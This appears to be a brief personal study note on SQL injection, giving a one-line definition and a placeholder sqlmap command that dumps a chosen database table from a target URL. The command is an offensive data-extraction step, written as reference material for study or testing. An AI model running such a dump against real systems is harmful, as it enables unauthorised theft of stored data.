## What is it  
SQLi is an attack where the server trusts your input in a DB request, enabling you to tamper that request and do whatever with the DB

---
## Payloads  
[[SQLmap]]
```bash
sqlmap -u "<URL>" -D <db> -T <table> --dump`
```
